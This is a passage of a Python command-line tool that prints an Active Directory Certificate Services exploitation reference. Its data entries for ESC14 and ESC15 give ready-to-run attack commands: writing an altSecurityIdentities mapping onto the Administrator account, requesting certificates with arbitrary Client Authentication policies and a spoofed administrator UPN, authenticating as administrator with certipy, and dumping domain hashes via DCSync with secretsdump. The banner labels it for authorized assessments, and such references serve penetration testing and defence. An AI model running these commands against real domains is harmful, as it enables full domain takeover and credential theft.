                    "Set-DomainObject -Identity 'administrator' "
                    "-Set @{'altSecurityIdentities'='X509:<I><ISSUER_DN><S><SUBJECT_DN>'}",
                    "",
                    "# Or via ldapmodify (Linux)",
                    "ldapmodify -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' << EOF",
                    "# dn: CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>",
                    "# changetype: modify",
                    "# add: altSecurityIdentities",
                    "# altSecurityIdentities: X509:<I><ISSUER_DN><S><SUBJECT_DN>",
                    "# EOF",
                ],
            },
            {
                "label": "Verify the mapping was written correctly",
                "commands": [
                    "ldapsearch -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' "
                    "-b 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>' "
                    "'(sAMAccountName=administrator)' altSecurityIdentities",
                    "# Confirm the X509:<I>...<S>... string matches your cert exactly",
                ],
            },
            {
                "label": "Authenticate using the mapped cert",
                "commands": [
                    "certipy auth -pfx <USER>.pfx -domain '<DOMAIN>' -dc-ip <DC_IP> "
                    "-username 'administrator'",
                ],
            },
            {
                "label": "Clean up — remove the altSecurityIdentities mapping after use",
                "commands": [
                    "# PowerView",
                    "Set-DomainObject -Identity 'administrator' "
                    "-Clear altSecurityIdentities",
                    "",
                    "# ldapmodify",
                    "ldapmodify -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' << EOF",
                    "# dn: CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>",
                    "# changetype: modify",
                    "# delete: altSecurityIdentities",
                    "# EOF",
                ],
            },
            {
                "label": "DCSync with obtained Administrator hash",
                "commands": [
                    "impacket-secretsdump '<DOMAIN>/administrator@<DC_IP>' -hashes ':<NT_HASH>'",
                ],
            },
        ],
        "references": [
            "https://github.com/ly4k/Certipy",
            "https://whoami.tw/posts/2024-esc14/",
        ],
    },
    15: {
        "title": "ESC15 / EKUwu — Arbitrary EKU in Schema Version 1 Templates",
        "description": (
            "Schema Version 1 certificate templates do not enforce EKU validation on "
            "the CA side. An attacker with enrollment rights can specify arbitrary "
            "Application Policy OIDs (including Client Authentication) during the "
            "request — even if the template does not list them."
        ),
        "indicators": [
            "Template Schema Version = 1",
            "Low-priv enrollment rights on the template",
            "Certipy shows 'ESC15' or 'EKUwu' in vulnerable output",
        ],
        "steps": [
            {
                "label": "Identify Schema V1 templates with enrollment rights",
                "commands": [
                    "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout",
                    "# Look for: Schema Version: 1 + ESC15 flag",
                ],
            },
            {
                "label": "Request cert with Client Authentication application policy",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<SCHEMA_V1_TEMPLATE>' "
                    "-application-policies 'Client Authentication' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "If template also allows SAN (ESC1+ESC15 combo) — specify target UPN",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<SCHEMA_V1_TEMPLATE>' "
                    "-application-policies 'Client Authentication' "
                    "-upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate with obtained cert",
                "commands": [
                    "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://github.com/ly4k/Certipy",
            "https://github.com/LuemmelSec/ESC15",
        ],
    },
}

# ---------------------------------------------------------------------------
# Display helpers
# ---------------------------------------------------------------------------

def hr(char="─", width=70, color=GRAY):
    print(f"{color}{char * width}{RESET}")

def print_banner():
    print(f"""
{CYAN}{BOLD}╔════════════════════════════════════════════════════════════════╗
║           AD CS ESC Exploit Reference                          ║
║        For authorized security assessments only                ║
╚════════════════════════════════════════════════════════════════╝{RESET}
""")

def print_entry(data):
    hr("═")
    print(f"\n{BOLD}{YELLOW}{data['title']}{RESET}\n")
    print(f"{WHITE}{data['description']}{RESET}\n")

    if "indicators" in data:
        print(f"{CYAN}{BOLD}Indicators / Prerequisites:{RESET}")
        for ind in data["indicators"]:
            print(f"  {GRAY}•{RESET} {ind}")
        print()

    print(f"{CYAN}{BOLD}Commands:{RESET}")
    for i, step in enumerate(data["steps"], 1):
        print(f"\n  {GREEN}\033[1mStep {i}:\033[0m{GREEN} {step['label']}{RESET}")
        for cmd in step["commands"]:
            if cmd == "":
                print()
            elif cmd.startswith("#"):
                print(f"    {WHITE}{cmd}{RESET}")
            else:
                print(f"    {YELLOW}{cmd}{RESET}")

    print(f"\n{CYAN}{BOLD}References:{RESET}")
    for ref in data["references"]:
        print(f"  {WHITE}{ref}{RESET}")
    print()

def print_menu():
    hr()
    print(f"\n{BOLD}Available topics:{RESET}\n")
    print(f"  {GREEN}0{RESET}  — General: Certipy enumeration & auth steps")
    for num, entry in ESC_DATA.items():
        short = entry["title"].split("—")[1].strip() if "—" in entry["title"] else entry["title"]
        print(f"  {GREEN}{num:2}{RESET}  — ESC{num}: {short}")
    print(f"\n  {GREEN}all{RESET} — Show everything")
    print(f"  {GREEN}q{RESET}   — Quit")
    print()

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print_banner()

    if len(sys.argv) > 1:
        # Non-interactive: adcs_ref.py 11  or  adcs_ref.py all
        arg = sys.argv[1].strip().lower()
        if arg == "all":
            print_entry(GENERAL)
            for entry in ESC_DATA.values():
                print_entry(entry)
        elif arg == "0":
            print_entry(GENERAL)
        else:
            try:
                num = int(arg)
                if num in ESC_DATA:
                    print_entry(ESC_DATA[num])
                else:
                    print(f"{RED}No data for ESC{num}.{RESET}")
                    sys.exit(1)
            except ValueError:
                print(f"{RED}Usage: adcs_ref.py [0-15 | all]{RESET}")
                sys.exit(1)
        return

    # Interactive mode
    while True:
        print_menu()
        try:
            choice = input(f"{BOLD}Enter ESC number, 'all', or 'q': {RESET}").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{GRAY}Bye.{RESET}")
            break

        if choice in ("q", "quit", "exit"):
            print(f"\n{GRAY}Bye.{RESET}")
            break
        elif choice == "all":
            print_entry(GENERAL)
            for entry in ESC_DATA.values():
                print_entry(entry)
        elif choice == "0":
            print_entry(GENERAL)
        else:
            try:
                num = int(choice)
                if num in ESC_DATA:
                    print_entry(ESC_DATA[num])
                else:
                    print(f"\n{RED}No entry for ESC{num}. Valid range: 1–15.{RESET}\n")
            except ValueError:
                print(f"\n{RED}Invalid input. Enter a number 0–15, 'all', or 'q'.{RESET}\n")


if __name__ == "__main__":
    main()
